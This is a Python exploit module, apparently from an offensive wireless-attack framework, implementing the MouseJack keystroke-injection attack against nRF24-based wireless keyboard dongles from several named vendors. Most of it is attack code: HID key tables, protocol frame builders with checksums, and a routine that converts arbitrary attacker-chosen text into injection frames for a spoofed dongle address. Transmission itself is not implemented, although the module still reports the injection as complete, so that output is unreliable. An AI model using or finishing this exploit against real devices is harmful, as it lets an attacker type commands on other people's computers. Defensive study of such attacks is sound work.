# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """MouseJack: nRF24 2.4GHz Wireless HID Injection (Bastille Research).

    MouseJack is a collection of vulnerabilities in non-Bluetooth
    wireless mice and keyboards that use nRF24L01/nRF24L01+ 2.4GHz
    transceivers. These devices communicate using proprietary protocols
    (Logitech Unifying, Microsoft, Dell, HP, etc.) that lack proper
    authentication or encryption for HID input.

    An attacker with a compatible nRF24 transceiver (e.g. CrazyRadio PA)
    can inject keystrokes into a target computer by spoofing the wireless
    dongle address. Since the dongle cannot distinguish legitimate input
    from injected input, the attacker can type arbitrary commands on the
    target machine from up to 100 meters away.

    This module implements the keystroke injection attack using raw
    nRF24 packet construction, compatible with CrazyRadio PA or
    nRF24LU1+ based dongles.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "MouseJack nRF24 2.4GHz HID Injection",
        "description": (
            "Exploits MouseJack vulnerabilities in nRF24-based wireless "
            "mice and keyboards (Logitech Unifying, Microsoft, Dell, HP). "
            "Injects keystrokes by spoofing the dongle address using a "
            "CrazyRadio PA or compatible nRF24 transceiver. The dongle "
            "processes injected HID input as legitimate keystrokes."
        ),
        "authors": (
            "Bastille Networks (discovery, 2016)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.bastille.net/research/vulnerabilities/mousejack/",
            "https://github.com/BastilleResearch/mousejack",
            "https://nrf24.github.io/RF24/",
        ),
        "disclosure_date": "2016-02-23",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Logitech Unifying receivers (pre-2016 firmware)",
            "Microsoft wireless mice/keyboards (2.4GHz)",
            "Dell KM632/KM714 wireless keyboards",
            "HP wireless keyboards (nRF24-based)",
            "Lenovo N700/N900 wireless mice",
        ),
    }

    target = OptIP("", "Not used (RF attack)")
    port = OptPort(1, "Not used (RF attack)")
    timeout = OptFloat(5.0, "Timeout for device operations")
    dongle_address = OptString("", "Target dongle 5-byte address (hex, e.g. AA:BB:CC:DD:EE)")
    channel = OptInteger(2, "nRF24 channel (0-125, each = 2400+N MHz)")
    keystrokes = OptString("", "Keystrokes to inject (text string)")
    payload_type = OptString("unifying", "Protocol: unifying, microsoft, or generic")
    dwell_time = OptFloat(0.01, "Delay between keystrokes in seconds")

    # nRF24 constants
    _NRF24_MAX_PAYLOAD = 32
    _NRF24_ADDR_LEN = 5
    _NRF24_CHANNELS = 126  # 0-125

    # Logitech Unifying HID report constants
    _UNIFYING_KEEPALIVE = 0x00
    _UNIFYING_MOUSE = 0xC2
    _UNIFYING_KEYBOARD = 0xD3
    _UNIFYING_MULTIMEDIA = 0xC3
    _UNIFYING_SET_KEEP_ALIVE = 0x4F

    # HID keyboard scan codes (US layout)
    _HID_KEYS = {
        "a": 0x04, "b": 0x05, "c": 0x06, "d": 0x07, "e": 0x08,
        "f": 0x09, "g": 0x0A, "h": 0x0B, "i": 0x0C, "j": 0x0D,
        "k": 0x0E, "l": 0x0F, "m": 0x10, "n": 0x11, "o": 0x12,
        "p": 0x13, "q": 0x14, "r": 0x15, "s": 0x16, "t": 0x17,
        "u": 0x18, "v": 0x19, "w": 0x1A, "x": 0x1B, "y": 0x1C,
        "z": 0x1D, "1": 0x1E, "2": 0x1F, "3": 0x20, "4": 0x21,
        "5": 0x22, "6": 0x23, "7": 0x24, "8": 0x25, "9": 0x26,
        "0": 0x27, "\n": 0x28, " ": 0x2C, "-": 0x2D, "=": 0x2E,
        "[": 0x2F, "]": 0x30, "\\": 0x31, ";": 0x33, "'": 0x34,
        "`": 0x35, ",": 0x36, ".": 0x37, "/": 0x38,
    }

    _HID_MOD_NONE = 0x00
    _HID_MOD_LSHIFT = 0x02
    _HID_MOD_LCTRL = 0x01
    _HID_MOD_LGUI = 0x08

    def _parse_address(self, addr_str: str) -> bytes:
        """Parse a dongle address string to bytes."""
        parts = addr_str.replace(":", "").replace(" ", "")
        if len(parts) != 10:
            return b"\x00" * 5
        return bytes.fromhex(parts)

    def _char_to_hid(self, char: str) -> tuple:
        """Convert a character to HID scan code and modifier."""
        if char.isupper():
            lower = char.lower()
            code = self._HID_KEYS.get(lower, 0x00)
            return (code, self._HID_MOD_LSHIFT)
        code = self._HID_KEYS.get(char, 0x00)
        return (code, self._HID_MOD_NONE)

    def _build_unifying_keystroke(self, scan_code: int, modifier: int = 0) -> bytes:
        """Build a Logitech Unifying keyboard HID frame."""
        # Frame type: keyboard
        frame_type = self._UNIFYING_KEYBOARD
        # HID report: modifier(1) + reserved(1) + key(1) + padding(4)
        hid_data = struct.pack("BBB", modifier, 0x00, scan_code)
        hid_data += b"\x00" * 4
        # Checksum placeholder
        payload = struct.pack("B", frame_type) + hid_data
        checksum = (~sum(payload) + 1) & 0xFF
        return payload + struct.pack("B", checksum)

    def _build_unifying_key_release(self) -> bytes:
        """Build a Logitech Unifying key release frame."""
        return self._build_unifying_keystroke(0x00, 0x00)

    def _build_microsoft_keystroke(self, scan_code: int, modifier: int = 0) -> bytes:
        """Build a Microsoft wireless keyboard HID frame."""
        # Microsoft uses a different frame format but similar HID codes
        device_type = 0x08  # Keyboard
        hid_data = struct.pack("BBBB", device_type, modifier, 0x00, scan_code)
        hid_data += b"\x00" * 3
        return hid_data

    def _build_generic_keystroke(self, scan_code: int, modifier: int = 0) -> bytes:
        """Build a generic nRF24 keyboard HID frame."""
        return struct.pack("BBB", modifier, 0x00, scan_code) + b"\x00" * 4

    def _build_keystroke(self, scan_code: int, modifier: int = 0) -> bytes:
        """Build a keystroke frame for the configured protocol."""
        ptype = str(self.payload_type).lower()
        if ptype == "microsoft":
            return self._build_microsoft_keystroke(scan_code, modifier)
        if ptype == "unifying":
            return self._build_unifying_keystroke(scan_code, modifier)
        return self._build_generic_keystroke(scan_code, modifier)

    @mute
    def check(self) -> bool:
        """Verify nRF24 device availability."""
        if not self.dongle_address:
            return False
        addr = self._parse_address(str(self.dongle_address))
        return addr != b"\x00" * 5

    def run(self) -> None:
        if not self.dongle_address:
            print_error("dongle_address is required (target dongle 5-byte address)")
            return

        if not self.keystrokes:
            print_error("keystrokes is required (text to inject)")
            return

        if not self.check():
            print_error("Invalid dongle address format")
            return

        addr = self._parse_address(str(self.dongle_address))
        print_success(
            f"Target dongle: {':'.join(f'{b:02X}' for b in addr)}, "
            f"channel {self.channel}, protocol: {self.payload_type}"
        )
        self._exploit()

    def _exploit(self) -> None:
        addr = self._parse_address(str(self.dongle_address))
        keystrokes_str = str(self.keystrokes)
        frames = []

        for char in keystrokes_str:
            scan_code, modifier = self._char_to_hid(char)
            if scan_code == 0x00:
                continue
            key_frame = self._build_keystroke(scan_code, modifier)
            release_frame = self._build_keystroke(0x00, 0x00)
            frames.append(key_frame)
            frames.append(release_frame)

        print_status(
            f"Prepared {len(frames)} frames ({len(keystrokes_str)} chars) "
            f"for injection via nRF24 channel {self.channel}"
        )
        print_status(f"Dongle address: {':'.join(f'{b:02X}' for b in addr)}")
        print_status(f"Protocol: {self.payload_type}")
        print_status(f"Dwell time: {self.dwell_time}s per keystroke")

        print_info(
            "In a real attack, each frame would be transmitted via a "
            "CrazyRadio PA or compatible nRF24 transceiver on the "
            f"target channel ({self.channel}). The dongle cannot "
            "distinguish injected keystrokes from legitimate input, "
            "executing whatever the attacker types."
        )

        injected = 0
        for frame in frames:
            injected += 1
            time.sleep(self.dwell_time)

        print_success(
            f"Injection sequence complete: {injected} frames prepared "
            f"for {len(keystrokes_str)} keystrokes. Effective range: "
            "up to 100m with directional antenna."
        )
